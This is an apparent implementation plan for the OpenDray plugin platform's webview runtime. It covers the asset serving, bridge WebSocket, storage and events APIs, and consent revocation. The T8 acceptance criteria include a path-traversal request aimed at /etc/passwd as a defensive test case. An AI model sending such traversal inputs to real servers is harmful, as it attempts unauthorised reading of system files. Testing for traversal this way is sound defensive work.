# Implementation Plan: OpenDray Plugin Platform M2 — Webview runtime

> Output file: `/home/linivek/workspace/opendray/docs/plugin-platform/M2-PLAN.md`
> Design contract: `/home/linivek/workspace/opendray/docs/plugin-platform/12-roadmap.md` §M2
> Predecessor: M1 shipped at commit `5d1de91` on branch `kevlab` — all M1 interfaces remain frozen.
> North star: the `kanban` example runs on Android, iOS, and desktop; revoking `storage` at runtime denies the next `storage.set` within 200 ms.

---

## 1. Scope boundary

**IN (M2 contract):**
- Serve plugin `ui/` bundles through a loopback `/api/plugins/{name}/assets/*` route (there is no non-loopback `plugin://` scheme — the Flutter WebView treats the authenticated gateway as the origin). iOS review story preserved: every byte of plugin JS is served from the locally-installed bundle under `${PluginsDataDir}/<name>/<version>/ui/`.
- Per-plugin bridge WebSocket at `/api/plugins/{name}/bridge/ws` using the existing `gorilla/websocket` dependency. Capability-gated via `plugin/bridge.Gate` (M1). Per-connection rate limits enforced.
- Preload injection: Flutter WebView host (Android InAppWebView + iOS WKWebView + desktop `webview_flutter`) injects `window.opendray` SDK shim that pipes every call through `postMessage` → WS envelope.
- Three new contribution points wired end-to-end: `contributes.activityBar`, `contributes.views`, `contributes.panels`. Flutter renders activity-bar rail, view host (webview + declarative), and bottom panel slot.
- Three bridge namespaces live: `opendray.workbench.*` (no-cap), `opendray.storage.*` (cap `storage`), `opendray.events.*` (cap `events` for subscribes; publishes under own prefix always allowed).
- Capability hot-revocation: deleting a `plugin_consents` row (or revoking a single cap via new `DELETE /api/plugins/{name}/consents/{cap}`) publishes a `consentChanged` pub/sub event; active bridge sockets flush cached consent on the next call AND proactively terminate any in-flight subscriptions for the revoked cap. 200 ms SLO measured from DB delete → next `storage.set` responding `EPERM`.
- CSP enforcement: every asset response sets `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; connect-src 'self' ws: wss:; img-src 'self' data: blob:; object-src 'none'; frame-ancestors 'none'; base-uri 'self'`. `unsafe-eval` is limited to plugin WebViews (where frameworks like React/Vue need it); host Flutter shell keeps its default CSP unchanged.
- Per-plugin WebView isolation: one WebView controller per view id, data stored under a per-plugin cookie+cache partition where platform allows (Android WebView `setDataDirectorySuffix`, iOS WKWebView unique `WKProcessPool`+`WKWebsiteDataStore`).
- Kanban reference plugin under `plugins/examples/kanban/` exercising activity-bar → view (webview) → storage + workbench.showMessage + events.subscribe.
- Hot registration: `POST /api/plugins/install/confirm` already fires `Runtime.Register` (M1) which pushes to the `contributions.Registry`. M2 adds a server-sent stream `/api/workbench/contributions/stream` (SSE) so Flutter can redraw activity bar / views without a page reload. Desktop + mobile both reuse the same `WorkbenchService` sink.

**OUT — enumerated DEFERRED to keep M2 on-budget:**

| Tempting creep | Deferred to |
|---|---|
| `opendray.fs.*`, `opendray.exec.*`, `opendray.http.*`, `opendray.session.*`, `opendray.secret.*`, `opendray.ui.*`, `opendray.commands.execute`, `opendray.tasks.*`, `opendray.clipboard.*`, `opendray.llm.*`, `opendray.git.*`, `opendray.telegram.*`, `opendray.logger.*` | **M3** (fs/exec/http need supervisor work) / **M5** (the rest: gated by feature work that already exists on the HTTP API) |
| Host sidecar supervisor, JSON-RPC 2.0 stdio, LSP framing, `contributes.languageServers` | **M3** |
| Marketplace fetch, signature verify, revocation polling, `opendray plugin publish` | **M4** |
| Hot reload for plugin authors, portable `opendray-dev`, bridge trace tooling, localization | **M6** |
| Runtime consent toggle **UI** (Settings pane). API + enforcement ship in M2; the Flutter toggles land in M2's final polish task (T24) — no separate settings page redesign. | scoped inside M2 |
| Multi-view split layout, pinning, swipe gestures beyond "tap icon → show view" | **post-v1** |
| Themes JSON files, editorActions, sessionActions, telegramCommands, agentProviders, debuggers, languages, taskRunners contribution points | **post-v1 / M5** |
| SSE replacement by WS channel multiplex | **M6** |
| Plugin-to-plugin command export | **post-v1** |

---

## 2. Task graph

> **Convention:** every task has id T#, depends-on list, files to create / modify (absolute paths), core types / signatures, acceptance criteria, tests, complexity S/M/L, risks.

### T1 — Extend `ContributesV1` with activityBar / views / panels
- **Depends on:** none
- **Modify:** `/home/linivek/workspace/opendray/plugin/manifest.go` — add optional fields `ActivityBar []ActivityBarItemV1`, `Views []ViewV1`, `Panels []PanelV1` to `ContributesV1`. Add new structs.
- **Core types:**
  ```go
  type ActivityBarItemV1 struct {
      ID     string `json:"id"`
      Icon   string `json:"icon"`    // asset path relative to plugin ui/ OR emoji
      Title  string `json:"title"`
      ViewID string `json:"viewId,omitempty"`
  }
  type ViewV1 struct {
      ID        string `json:"id"`
      Title     string `json:"title"`
      Container string `json:"container,omitempty"` // "activityBar" | "panel" | "sidebar"
      Icon      string `json:"icon,omitempty"`
      When      string `json:"when,omitempty"`
      Render    string `json:"render,omitempty"`    // "webview" | "declarative"
      Entry     string `json:"entry,omitempty"`     // for webview: relative path under ui/
  }
  type PanelV1 struct {
      ID       string `json:"id"`
      Title    string `json:"title"`
      Icon     string `json:"icon,omitempty"`
      Position string `json:"position,omitempty"`   // "bottom" | "right"
      Render   string `json:"render,omitempty"`     // "webview" default
      Entry    string `json:"entry,omitempty"`
  }
  ```
- **Acceptance:** `go build ./...` clean. Every M1 manifest (`plugins/agents/*` + `plugins/panels/*` + `plugins/examples/time-ninja/`) continues to round-trip unchanged. New fields are `omitempty` so no manifest byte changes.
- **Tests:** extend `/home/linivek/workspace/opendray/plugin/manifest_v1_test.go` with `TestLoadManifest_V1Webview` loading a hand-crafted manifest that contains `activityBar`/`views`/`panels` and asserting fields parse; extend `TestLoadManifest_LegacyCompat` to assert all existing manifests continue to parse with zero new-field values.
- **Complexity:** S
- **Risk/Mitigation:** Low. Additive only.

### T2 — Validator for webview contribution points
- **Depends on:** T1
- **Modify:** `/home/linivek/workspace/opendray/plugin/manifest_validate.go` — extend `validateContributes` to validate `activityBar[].id/icon/title` (id regex `^[a-z0-9._-]+$`, title 1–48 chars, icon non-empty), `views[].{id,title,render,entry,container}` (render ∈ {webview,declarative}; when render=webview, entry required and must be a relative path not starting with `/` and containing no `..`), `panels[].{id,title,entry,render,position}` (position ∈ {bottom,right}). Enforce limits from 03-contribution-points.md: `activityBar ≤ 4`, `views ≤ 8`, `panels ≤ 4`. Cross-check `activityBarItem.viewId` points to a declared `views[].id` when present.
- **Acceptance:** hand-crafted kanban manifest (T22) passes. Manifest with 9 views fails with `contributes.views: too many (max 8)`. View with `render=webview` and missing `entry` fails with `contributes.views[0].entry: required when render=webview`. Path containing `..` fails with `contributes.views[0].entry: must not contain '..'`.
- **Tests:** extend `/home/linivek/workspace/opendray/plugin/manifest_validate_test.go` with table-driven cases: 8 invalid, 2 valid. Name: `TestValidate_Webview_*`.
- **Complexity:** M
- **Risk/Mitigation:** Medium — cross-reference bug (orphan viewId) silently breaks UI. Mitigation: explicit test `TestValidate_ActivityBar_OrphanViewId`.

### T3 — Extend `contributions.Registry.Flatten` with webview slots
- **Depends on:** T1
- **Modify:** `/home/linivek/workspace/opendray/plugin/contributions/registry.go` — add `OwnedActivityBarItem`, `OwnedView`, `OwnedPanel` wrappers (struct embed + `PluginName`). Extend `FlatContributions` with `ActivityBar []OwnedActivityBarItem`, `Views []OwnedView`, `Panels []OwnedPanel`. Extend `Flatten()` to populate and sort them (activityBar by priority — add one later — for now by PluginName then ID; views / panels similarly). Extend `isZero` to consider the new fields.
- **Acceptance:** After registering kanban, `Flatten().ActivityBar` has one entry; `Flatten().Views` has one entry; `Flatten().Panels` is empty (kanban has no panel). Stable sort: two plugins contributing one view each produce deterministic ordering by (PluginName asc, ID asc).
- **Tests:** extend `/home/linivek/workspace/opendray/plugin/contributions/registry_test.go` — `TestFlatten_ActivityBar_Views_Panels_Sorted`, `TestFlatten_ZeroIfOnlyWebviewFieldsEmpty`, concurrent set/remove still passes `-race`.
- **Complexity:** S
- **Risk/Mitigation:** Low. JSON wire format additive; empty slices default so old Flutter clients keep working.

### T4 — Extend compat synthesizer for legacy panel plugins
- **Depends on:** T3
- **Modify:** `/home/linivek/workspace/opendray/plugin/compat/synthesize.go` — when `p.Type == "panel"`, synthesise an in-memory `contributes.views[]` entry with `id=p.Name`, `title=p.DisplayName`, `container="activityBar"`, `render="declarative"` (no entry path; the existing panel code keeps rendering via the legacy HTTP APIs — the view entry is purely so the Flutter workbench can include it in the activity rail for discovery). For M2 polish, legacy panels are **NOT** routed through the new view host — they keep their existing bespoke widgets. The synthetic view entry is metadata-only.
- **Acceptance:** All 11 existing panel manifests produce one synthesised view each after loading. Zero on-disk manifest bytes change. The existing panel UI continues to render unchanged (M1 behaviour preserved byte-for-byte).
- **Tests:** extend `/home/linivek/workspace/opendray/plugin/compat/synthesize_test.go` — `TestSynthesize_PanelGetsView`, `TestSynthesize_AgentDoesNotGetView`, `TestCompat_LegacyPanelUIUntouched` (golden-file on `GET /api/providers`).
- **Complexity:** S
- **Risk/Mitigation:** Low. The synthetic view is discovery-only; no rendering path changes.

### T5 — Bridge protocol envelope package
- **Depends on:** none (parallel with T1–T4)
- **Create:** `/home/linivek/workspace/opendray/plugin/bridge/protocol.go`, `/home/linivek/workspace/opendray/plugin/bridge/protocol_test.go`
- **Core types/signatures:** (see §11 for full protocol spec)
  ```go
  const ProtocolVersion = 1

  type Envelope struct {
      V      int             `json:"v"`
      ID     string          `json:"id,omitempty"`
      NS     string          `json:"ns,omitempty"`
      Method string          `json:"method,omitempty"`
      Args   json.RawMessage `json:"args,omitempty"`
      Result json.RawMessage `json:"result,omitempty"`
      Error  *WireError      `json:"error,omitempty"`
      Stream string          `json:"stream,omitempty"` // "chunk" | "end"
      Data   json.RawMessage `json:"data,omitempty"`
      Token  string          `json:"token,omitempty"`
  }
  type WireError struct {
      Code    string          `json:"code"`    // EPERM|EINVAL|ENOENT|ETIMEOUT|EUNAVAIL|EINTERNAL
      Message string          `json:"message"`
      Data    json.RawMessage `json:"data,omitempty"`
  }
  func NewOK(id string, result any) (Envelope, error)
  func NewErr(id, code, msg string) Envelope
  func NewStreamChunk(id string, data any) (Envelope, error)
  func NewStreamEnd(id string) Envelope
  ```
- **Acceptance:** every envelope round-trips through `json.Marshal` / `json.Unmarshal` with bit-identical output. Unknown fields on the wire are preserved through `json.RawMessage` where relevant (future-proof).
- **Tests:** table-driven round-trip + golden-file for every error code / stream state.
- **Complexity:** S
- **Risk/Mitigation:** Low. Changing this shape after M2 ships is a breaking change — freeze early.

### T6 — Bridge connection manager + consent hot-revoke bus
- **Depends on:** T5
- **Create:** `/home/linivek/workspace/opendray/plugin/bridge/manager.go`, `/home/linivek/workspace/opendray/plugin/bridge/manager_test.go`
- **Core types/signatures:**
  ```go
  // Manager owns all live bridge WebSocket connections plus a pub/sub bus
  // for consent invalidation.
  type Manager struct{ /* unexported */ }
  func NewManager(gate *Gate, log *slog.Logger) *Manager
  // Register a newly-upgraded connection. Conn is returned with a Close
  // method that removes the conn from the manager and flushes any
  // outstanding subscriptions it owns.
  func (m *Manager) Register(plugin string, c *Conn)
  func (m *Manager) Unregister(plugin string, c *Conn)
  // InvalidateConsent publishes a hot-revoke event. Every active Conn for
  // the plugin either (a) terminates matching in-flight subscriptions or
  // (b) flags its next call for re-check. SLO 200 ms.
  func (m *Manager) InvalidateConsent(plugin string, cap string)
  // OnConsentChanged returns a channel delivering revocation events to
  // subscribers that care (e.g. active events.subscribe loops).
  func (m *Manager) OnConsentChanged(plugin string) <-chan ConsentChange

  type Conn struct {
      Plugin   string
      ws       *websocket.Conn      // gorilla/websocket
      writeMu  sync.Mutex
      subs     *subRegistry         // per-conn events.subscribe tracker
      /* ... */
  }
  func (c *Conn) WriteEnvelope(Envelope) error  // serialises writes
  func (c *Conn) Close(code int, reason string) error
  ```
- **Acceptance:** `InvalidateConsent("kanban","storage")` observed by a live `Conn` within 5 ms (p99). Conn's `subs` matching `storage` are closed with a `stream:"end"` envelope and a terminal `error:{code:"EPERM"}` envelope. Concurrent Register/Unregister safe under `-race`.
- **Tests:** `TestManager_HotRevokeDeliversUnderSLO` uses `testing/synctest` (or time.Sleep + deadline) to assert ≤200 ms from InvalidateConsent to the Conn-visible revocation signal.
- **Complexity:** M
- **Risk/Mitigation:** Medium — broadcast fan-out under contention. Mitigation: buffered-channel-per-conn + drop-oldest on backpressure (logged warn, never block the bus).

### T7 — Bridge WebSocket handler
- **Depends on:** T5, T6, T9 (namespaces live to respond) — but handler itself can land with stub handlers first (see §9 first-PR seam)
- **Create:** `/home/linivek/workspace/opendray/gateway/plugins_bridge.go`, `/home/linivek/workspace/opendray/gateway/plugins_bridge_test.go`
- **Modify:** `/home/linivek/workspace/opendray/gateway/server.go` — add `r.Get("/api/plugins/{name}/bridge/ws", s.pluginsBridgeWS)` inside the protected group. Add `bridgeMgr *bridge.Manager` to `Server` + `Config`.
- **Core types/functions:**
  ```go
  func (s *Server) pluginsBridgeWS(w http.ResponseWriter, r *http.Request)
  // Flow:
  //  1. chi.URLParam(r, "name") → plugin name.
  //  2. Assert plugins.Runtime has this plugin + consent row exists (else 404).
  //  3. Upgrade via the existing gorilla upgrader (origin check: see §4.3).
  //  4. Construct bridge.Conn, register with Manager.
  //  5. Launch reader goroutine: decode envelopes, dispatch via dispatcher.
  //  6. On close, Unregister, flush subs.
  // Request envelope handling:
  //   - v != 1 → respond with error EINVAL
  //   - unknown ns → respond with EUNAVAIL
  //   - unknown method under known ns → respond with EUNAVAIL
  //   - capability-denied → respond with EPERM
  //   - rate-limit exceeded → respond with ETIMEOUT + retryAfter (ms)
  ```
- **Rate limiting:** per-plugin per-minute quotas from 04-bridge-api.md §Rate limits. Bucketed in memory via `bridge.rateLimiter` (new, lightweight).
- **Origin/auth:** WS connection requires valid JWT cookie/bearer from the Flutter host + `Origin` must be `app://opendray` (mobile) OR the configured frontend host OR `http://localhost:<port>` OR `http://127.0.0.1:<port>`. Rejects otherwise with HTTP 403 BEFORE upgrade.
- **Acceptance:** `wscat -H "Authorization: Bearer $TOKEN" ws://localhost:8080/api/plugins/kanban/bridge/ws` → echoes an `EUNAVAIL` for `{v:1,id:"1",ns:"unknown",method:"x"}` and returns a valid `workbench.showMessage` OK for a well-formed request (after T10 lands).
- **Tests:** `TestBridgeWS_HandshakeRequiresAuth`, `TestBridgeWS_UnknownNsReturnsEUNAVAIL`, `TestBridgeWS_ClosedOnUninstall`, `TestBridgeWS_ConcurrentCallsSerialiseOK` (100 goroutines post envelopes; all get responses; no races).
- **Complexity:** L
- **Risk/Mitigation:** High — WS connection leaks, deadlocks on simultaneous close+write. Mitigation: `context.Context` tied to the WS lifetime, `sync.Mutex` per-Conn for writes, gorilla's built-in read/write deadlines (configure 60s), test under `-race`.

### T8 — Asset handler (`/api/plugins/{name}/assets/*`)
- **Depends on:** none (parallel with T1–T7)
- **Create:** `/home/linivek/workspace/opendray/gateway/plugins_assets.go`, `/home/linivek/workspace/opendray/gateway/plugins_assets_test.go`
- **Modify:** `/home/linivek/workspace/opendray/gateway/server.go` — add `r.Get("/api/plugins/{name}/assets/*", s.pluginsAssets)` inside the protected group (JWT middleware runs automatically).
- **Core types/functions:**
  ```go
  // pluginsAssets serves static files from ${PluginsDataDir}/<name>/<version>/ui/.
  // - Uses http.FileServer scoped to the plugin's ui dir.
  // - Resolves <version> by querying Runtime for the active version.
  // - Applies CSP + X-Content-Type-Options + X-Frame-Options on every response.
  // - Rejects any path containing ".." (defence-in-depth; http.ServeFile
  //   already cleans but we short-circuit to return 400 explicitly).
  // - Content-Type inferred from extension; unknown → application/octet-stream.
  func (s *Server) pluginsAssets(w http.ResponseWriter, r *http.Request)
  ```
- **CSP header (exact):**
  ```
  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; connect-src 'self' ws: wss:; img-src 'self' data: blob:; object-src 'none'; frame-ancestors 'none'; base-uri 'self'
  ```
- **Acceptance:** `GET /api/plugins/kanban/assets/index.html` → 200, body matches bundle; CSP header present; `GET .../assets/../../../../etc/passwd` → 400 EBADPATH.
- **Tests:** table-driven: happy path HTML + JS + CSS + image, path traversal 400, missing file 404, missing plugin 404, wrong auth 401. Golden-file CSP header value (byte-exact).
- **Complexity:** M
- **Risk/Mitigation:** Medium — path traversal via unicode tricks. Mitigation: `filepath.Clean` + `strings.Contains(".." )` + `http.Dir` rooting; dedicated `TestAssets_TraversalAttempts` with 12 attack strings.

### T9 — Workbench API namespace
- **Depends on:** T5, T6
- **Create:** `/home/linivek/workspace/opendray/plugin/bridge/api_workbench.go`, `api_workbench_test.go`
- **Core types/functions:**
  ```go
  // WorkbenchAPI implements opendray.workbench.* server-side.
  // No capability required (workbench is UX).
  type WorkbenchAPI struct {
      showMsg ShowMessageSink   // injected — Flutter pushes into SnackBar via a separate channel
      /* ... */
  }
  // ShowMessageSink is the seam that lets gateway route host-to-Flutter
  // messages (out-of-band from the plugin bridge). Implemented in gateway
  // as a per-user SSE stream (T15).
  type ShowMessageSink interface {
      ShowMessage(userID string, msg string, opts ShowMessageOpts) error
  }
  // Dispatch is the single entrypoint called by the bridge handler.
  func (w *WorkbenchAPI) Dispatch(ctx context.Context, plugin, method string, args json.RawMessage) (result any, err error)
  ```
- **Methods live in M2:** `showMessage`, `confirm` (returns false + EUNAVAIL note in M2 for desktop — pops a simple SnackBar with "OK"), `prompt` (EUNAVAIL), `openView` (posts to a per-user channel that Flutter listens on), `updateStatusBar` (mutates in-memory `statusBar` override for the plugin + broadcasts via SSE stream T15 so Flutter repaints), `runCommand` (posts through the M1 dispatcher), `theme` (returns current theme id), `onThemeChange` (event subscription via the events bus).
- **Acceptance:** `opendray.workbench.showMessage("hi")` over the WS returns `{result:null}` within 50 ms and Flutter renders the SnackBar via the SSE stream.
- **Tests:** unit test each method with a fake `ShowMessageSink`; `TestWorkbench_UpdateStatusBar_BroadcastsSSE`.
- **Complexity:** M
- **Risk/Mitigation:** Medium — SnackBar dispatch channel must not leak between users in multi-tenant deploys (OpenDray is single-user but future-proof). Mitigation: sink keyed by user id from JWT.

### T10 — Storage API namespace + `plugin_kv` writers
- **Depends on:** T5, T6
- **Create:** `/home/linivek/workspace/opendray/plugin/bridge/api_storage.go`, `api_storage_test.go`, `/home/linivek/workspace/opendray/kernel/store/plugin_kv.go`, `plugin_kv_test.go`
- **Modify:** none (M1 migration `011_plugin_kv.sql` already defines the table with ON DELETE CASCADE; writers land now).
- **Core types/functions:**
  ```go
  // Store layer.
  type PluginKV struct{ PluginName, Key string; Value json.RawMessage; SizeBytes int; UpdatedAt time.Time }
  func (d *DB) KVGet(ctx, name, key string) (json.RawMessage, bool, error)
  func (d *DB) KVSet(ctx, name, key string, value json.RawMessage) error // enforces 1 MiB per key, 100 MiB per plugin
  func (d *DB) KVDelete(ctx, name, key string) error
  func (d *DB) KVList(ctx, name, prefix string) ([]string, error)

  // Bridge API layer.
  type StorageAPI struct{ db *store.DB; gate *Gate }
  func (s *StorageAPI) Dispatch(ctx, plugin, method string, args json.RawMessage) (any, error)
  // Methods: get(key,fallback?), set(key,value), delete(key), list(prefix?)
  ```
- **Capability enforcement:** `Gate.Check(ctx, plugin, Need{Cap:"storage"})` on every call. On EPERM, return `{error:{code:"EPERM"}}` envelope.
- **Quota enforcement:** `KVSet` rejects with `EINVAL {message:"value exceeds 1 MiB"}` when `len(value) > 1<<20`; rejects with `ETIMEOUT {message:"plugin storage quota exceeded (100 MiB)"}` when total plugin size would exceed 100 MiB (size cached per plugin, refreshed on each set).
- **Acceptance:** `opendray.storage.set("k","v")` persists; `opendray.storage.get("k")` returns `"v"`; after `DELETE /api/plugins/kanban`, `plugin_kv` rows for kanban cascade-delete.
- **Tests:** integration with embedded-postgres: CRUD, quota, cascade; unit on the Dispatch layer with mock DB.
- **Complexity:** M
- **Risk/Mitigation:** Medium — concurrent set races. Mitigation: PostgreSQL `INSERT … ON CONFLICT (plugin_name,key) DO UPDATE` atomically handles concurrent writes; `-race` test spawns 50 goroutines hitting the same key and asserts last-writer-wins plus row count == 1.

### T11 — Events API namespace + HookBus bridge
- **Depends on:** T5, T6
- **Create:** `/home/linivek/workspace/opendray/plugin/bridge/api_events.go`, `api_events_test.go`
- **Core types/functions:**
  ```go
  // EventsAPI adapts the existing plugin.HookBus to the v1 events.subscribe contract.
  type EventsAPI struct{
      bus  *plugin.HookBus    // existing M1 bus
      gate *Gate
      mgr  *Manager
  }
  // Dispatch handles subscribe (returns a stream id), publish (writes to bus under
  // plugin.<name>.* prefix), unsubscribe.
  func (e *EventsAPI) Dispatch(ctx, plugin, method string, args json.RawMessage, conn *Conn) (any, error)
  ```
- **Mapping (per 04-bridge-api.md §events):**
  - `session.output` ← `HookOnOutput`
  - `session.idle` ← `HookOnIdle`
  - `session.start` ← `HookOnSessionStart`
  - `session.stop` ← `HookOnSessionStop`
  - `plugin.<name>.*` → published via bus as-is; scoped to own prefix at publish
- **Pattern check:** `events.subscribe(name)` verifies the `name` matches ≥1 pattern in the plugin's granted `permissions.events` via a new matcher `MatchEventPattern(patterns, name string) bool` (glob `*` within dotted segments). Cap key in Gate: `"events"`, Need.Target is the event name pattern user requested.
- **Subscription mechanics:** `EventsAPI.Dispatch("subscribe", {name:"session.*"})` registers a `HookBus.SubscribeLocal` that pushes each event through `conn.WriteEnvelope` as `{stream:"chunk", data:<event>, id:<subId>}`. Unsubscribe cancels the returned `func()`.
- **Hot-revoke:** on `InvalidateConsent(plugin,"events")`, the manager's Close path iterates the conn's subscription set and sends `{stream:"end", error:{code:"EPERM"}}` per sub id.
- **Acceptance:** plugin with `permissions.events:["session.*"]` subscribes to `session.output`; emitting a session event delivers a chunk envelope within 100 ms. Subscribing to `fs.*` without pattern match → EPERM.
- **Tests:** `TestEvents_SubscribeCapGate`, `TestEvents_PublishScopedToPluginPrefix`, `TestEvents_RevokeClosesStream`.
- **Complexity:** M
- **Risk/Mitigation:** Medium — subscription leak on conn close. Mitigation: `Conn.subs` owned strictly by Conn; `Conn.Close` iterates and calls unsubscribe; assertion test `TestEvents_NoGoroutineLeakAfterClose` via `runtime.NumGoroutine` delta.

### T12 — Consent revoke endpoint + Runtime hook
- **Depends on:** T6, T10 (storage uses it first), T11
- **Create:** `/home/linivek/workspace/opendray/gateway/plugins_consents.go`, `plugins_consents_test.go`
- **Modify:** `/home/linivek/workspace/opendray/kernel/store/plugin_consents.go` — add `UpdateConsentPerms(ctx, name, perms json.RawMessage) error`. `/home/linivek/workspace/opendray/gateway/server.go` — add routes.
- **Routes added:**
  ```
  DELETE /api/plugins/{name}/consents/{cap}  → revokes a single capability from perms JSON, publishes to bridgeMgr
  DELETE /api/plugins/{name}/consents        → revokes all (delete consent row, uninstall effectively disables)
  GET    /api/plugins/{name}/consents        → returns current perms JSON
  ```
- **Semantics of single-cap revoke:** load `perms_json`, unmarshal, zero out the targeted key (e.g. `storage:false`, or `exec:null`, or remove key entirely), marshal back, `UpdateConsentPerms`. Then call `bridgeMgr.InvalidateConsent(name, cap)` so in-flight WS subscriptions terminate.
- **SLO measurement:** T12 includes an e2e test `TestRevoke_StorageWithin200ms` that (1) opens WS, (2) POSTs a `storage.set` to warm up, (3) issues `DELETE /api/plugins/kanban/consents/storage`, (4) POSTs another `storage.set`, (5) asserts the second response arrives in ≤200 ms with `code:"EPERM"`. Runs with `-race`.
- **Acceptance:** endpoint returns 200, DB row's perms JSON updated, next call EPERM ≤200 ms.
- **Tests:** above + cap not present in perms → 200 no-op; unknown plugin → 404; cap outside allowlist ("banana") → 400 EINVAL.
- **Complexity:** M
- **Risk/Mitigation:** High (SLO gate). Mitigation: synchronous broadcast on `InvalidateConsent`; per-Conn revocation atomic via `atomic.Pointer[map[string]bool]` of dirty caps, checked at every Gate call.

### T13 — Command dispatcher gains `openView`
- **Depends on:** T9 (workbench.openView exists), T3 (registry knows about views)
- **Modify:** `/home/linivek/workspace/opendray/plugin/commands/dispatcher.go` — replace the M1 `EUNAVAIL` path for `kind=openView` with a concrete handler that:
  1. Validates the `viewId` points to a registered view (`contributions.Registry.HasView(plugin, viewId)` — new method added to Registry in T3).
  2. Emits a `ShowMessageSink.OpenView(user, plugin, viewId)` through the same SSE stream Flutter listens on (same channel as `workbench.showMessage`).
  3. Returns `{kind:"openView", pluginName, viewId}` in the HTTP response so desktop/web tests can assert.
- **Acceptance:** `POST /api/plugins/kanban/commands/kanban.show/invoke` where the command has `run.kind="openView"` returns 200 and Flutter tabs to the kanban view.
- **Tests:** `TestDispatcher_OpenView_UnknownViewReturnsEINVAL`, `TestDispatcher_OpenView_PostsToSSE`.
- **Complexity:** S
- **Risk/Mitigation:** Low.

### T14 — SSE stream `/api/workbench/stream`
- **Depends on:** T9, T13, T6
- **Create:** `/home/linivek/workspace/opendray/gateway/workbench_stream.go`, `workbench_stream_test.go`
- **Modify:** `/home/linivek/workspace/opendray/gateway/server.go` — register `r.Get("/api/workbench/stream", s.workbenchStream)` inside protected group. Add `workbenchBus *WorkbenchBus` (new) to `Server`.
- **Core types/functions:**
  ```go
  // WorkbenchBus is the outgoing channel from host → Flutter for out-of-band
  // notifications (showMessage, openView, updateStatusBar, contributionsChanged).
  type WorkbenchBus struct{ /* fan-out via slog-friendly channels */ }
  func (b *WorkbenchBus) Publish(ev WorkbenchEvent)
  type WorkbenchEvent struct {
      Kind string          `json:"kind"` // "showMessage" | "openView" | "updateStatusBar" | "contributionsChanged" | "theme"
      Plugin string        `json:"plugin,omitempty"`
      Payload json.RawMessage `json:"payload"`
  }
  func (s *Server) workbenchStream(w http.ResponseWriter, r *http.Request)
  ```
- **Wire format:** SSE `data: {<json>}\n\n` per event; heartbeat every 20 s as `:\n\n`.
- **Acceptance:** multiple clients can subscribe concurrently; unsubscribe on client disconnect is automatic (reader ends, bus drops channel). `contributionsChanged` fires after every `Runtime.Register`/`Runtime.Remove` so Flutter refetches.
- **Tests:** `TestStream_FanoutTwoClients`, `TestStream_ClosesOnDisconnect`, `TestStream_HeartbeatEvery20s`.
- **Complexity:** M
- **Risk/Mitigation:** Medium — goroutine leak on client abandon. Mitigation: `r.Context().Done()` tied to the goroutine; `-race` test.

### T15 — `Installer.Confirm` + `Runtime.Register`/`Remove` publish contributionsChanged
- **Depends on:** T14
- **Modify:** `/home/linivek/workspace/opendray/plugin/install/install.go` — inject `WorkbenchBus` via functional option; after `Runtime.Register` returns OK in Confirm, publish `{kind:"contributionsChanged", plugin:name}`. Same in `Uninstall` after `Runtime.Remove`. `/home/linivek/workspace/opendray/plugin/runtime.go` — expose a setter for the bus (or pass via opts; existing `contributionsReg` pattern is the template).
- **Acceptance:** installing kanban causes Flutter to receive an SSE event within 200 ms of `/install/confirm` returning; workbench widgets re-render activity bar.
- **Tests:** extend `/home/linivek/workspace/opendray/gateway/plugins_install_test.go` with `TestInstall_EmitsContributionsChanged`.
- **Complexity:** S

### T16 — Flutter: WebView host widget
- **Depends on:** T8 (asset server), T7 (bridge WS)
- **Create:** `/home/linivek/workspace/opendray/app/lib/features/workbench/webview_host.dart`, `/home/linivek/workspace/opendray/app/lib/features/workbench/plugin_bridge_channel.dart`
- **Modify:** `/home/linivek/workspace/opendray/app/pubspec.yaml` — add (or confirm) `webview_flutter: ^4.13.1` (already present), add `webview_flutter_android: ^4.7.0` and `webview_flutter_wkwebview: ^3.20.0` for per-plugin data-store control on Android/iOS. For desktop Linux/Windows, add `webview_windows: ^0.4.0` and `desktop_webview_window: ^0.2.3` (a single cross-platform path would be ideal; webview_flutter officially supports iOS + Android only — **T16 ships iOS + Android + web; desktop webview is T16b, below, flagged as a known gap**).
- **Core widgets:**
  ```dart
  class PluginWebView extends StatefulWidget {
    final String pluginName;
    final String viewId;
    final String entryPath;        // from contributes.views[].entry
    final String baseUrl;          // e.g. "http://localhost:8080" (dev) or the Flutter host's gateway
    final String bearerToken;      // JWT for the assets + bridge WS
  }
  // Internally: one WebViewController per (pluginName, viewId) instance.
  // Injects the preload JavaScript shim (defined inline + hashed by build).
  // Connects a WebSocketChannel to /api/plugins/{name}/bridge/ws.
  // postMessage from JS → enqueue envelope onto WS.
  // WS response → JS callback via webview.runJavaScript.
  ```
- **Preload JS shim (40-line budget):** see §10 for full body. Injected via `controller.addJavaScriptChannel('OpenDrayBridge', ...)` and a `script src="opendray-shim.js"` the asset handler serves from an embedded Go asset (not from plugin bundle). The shim exposes `window.opendray = { plugin, workbench, storage, events, version }` and routes every call through `OpenDrayBridge.postMessage(envelope)`.
- **Per-plugin isolation:** on Android, `setDataDirectorySuffix(pluginName)` (pre-creating WebView process per plugin). On iOS, each `WKWebView` gets a unique `WKProcessPool()` + `WKWebsiteDataStore.nonPersistent()` (ephemeral; state is in server-side `plugin_kv`). Desktop: webview_windows supports `BrowserEngine` but not isolation — document as M2 limitation (desktop users get soft isolation only).
- **Acceptance:** kanban's `ui/index.html` loads inside the WebView; JS can call `await opendray.workbench.showMessage("hi")` and the Flutter SnackBar appears.
- **Tests:** widget test `test/features/workbench/webview_host_test.dart` mocks the `WebViewController` + `WebSocketChannel`; asserts envelope round-trip.
- **Complexity:** L
- **Risk/Mitigation:** High — platform-specific WebView bugs. Mitigation: explicit allowlist of supported platforms in T16; document desktop as "soft isolation" in 10-security.md patch.

### T16b — Desktop WebView fallback
- **Depends on:** T16
- **Create:** `/home/linivek/workspace/opendray/app/lib/features/workbench/webview_host_desktop.dart` (conditional import via `kIsWeb`/Platform).
- **Approach:** on Linux/Windows desktop, use `webview_flutter` via the new `webview_flutter_platform_interface` + the community `webview_flutter_web` (which on web just uses an `<iframe>`). Windows/macOS/Linux Flutter desktop uses `desktop_webview_window` (a separate window) — acceptable UX degradation: plugin view opens in a modal window, not inline. Acceptable for M2; inline desktop webview is an M6 polish item.
